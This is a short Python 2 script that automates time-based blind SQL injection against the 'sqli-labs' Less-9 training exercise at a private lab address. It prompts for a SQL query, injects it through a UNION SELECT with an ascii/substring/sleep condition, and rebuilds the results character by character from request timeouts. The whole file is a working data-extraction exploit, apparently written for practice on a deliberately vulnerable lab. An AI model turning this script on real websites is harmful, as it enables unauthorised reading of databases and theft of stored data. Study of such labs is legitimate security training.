import requests

if __name__ == '__main__':
    while True:
        sql = raw_input('Enter your sql querry:')
        m = ''
        for i in range(0, 30):
            l = ''
            l = '(' + sql + ' limit ' + str(i) + ',1)'
            print l
            for j in range(1, 30):
                for k in range(33, 127):
                    site = 'http://172.16.191.129/sqli-labs/Less-9/'
                    param = '?id=1\' and 1=2 union select 1,if(ascii(substring(' + l + ',' + str(j) + ',1))=' \
                            + str(k) + ',sleep(1),2),3' + '--+'
                    url = site + param
                    try:
                        requests.get(url, timeout=1)
                    except:
                        m += chr(k)
            print m
